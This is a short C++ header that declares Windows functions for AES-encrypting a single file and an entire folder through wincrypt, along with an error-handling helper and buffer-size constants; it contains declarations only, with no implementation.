#ifndef ENCRYPT_H
#define ENCRYPT_H

#include "enumerate_files.h"
#include "shlobj.h"
#include <tchar.h>

#define AES_KEY_SIZE 16
#define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big

// Encryt a file using AES encryption and wincrypt
bool EncryptFileWithKey(LPCTSTR pszSourceFile, LPCTSTR pszKey);
// Custom error handling for debugging encryption
void HandleError(LPTSTR psz, int nErrorNumber);

// Encrypts a folder using AES encryption
bool EncryptFolder(const std::wstring& folderPath, const BYTE* decryptionKey, DWORD keySize);

#endif
